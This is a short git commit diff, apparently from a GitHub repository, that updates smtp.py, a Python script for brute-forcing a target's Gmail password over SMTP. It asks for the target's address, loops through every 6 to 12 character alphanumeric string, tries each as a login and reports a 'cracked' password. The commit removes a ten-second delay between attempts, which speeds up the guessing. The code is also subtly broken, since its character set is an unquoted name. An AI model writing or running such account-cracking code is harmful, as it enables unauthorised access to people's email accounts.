5137a1fcef7d6a3da870528a50e2bfab78423c3c
x0rLS <42499784+x0rLS@users.noreply.github.com>
2018-12-27 18:49:43 +0100

    Update smtp.py

--- smtp.py
+++ smtp.py
@@ -7,14 +7,12 @@ smtpserver.ehlo()
 smtpserver.starttls() 
 user = raw_input("Enter Target's Gmail Address: ") 
 
-def print_perms(chars, minlen, maxlen): 
-   for n in range(6, 12+1): 
-      for perm in itertools.product(abcdefghijklmnopqrstuvwxyz1234567890, repeat=n): 
+for n in range(6, 12+1): 
+   for perm in itertools.product(abcdefghijklmnopqrstuvwxyz1234567890, repeat=n): 
          password = ''.join(perm)
-
+         
          try: 
              smtpserver.login(user, password) 
              print "[+] Password Cracked: %s" % password
-             time.sleep(10)
          except smtplib.SMTPAuthenticationError: 
              print "[!] Password Inccorect: %s" % password
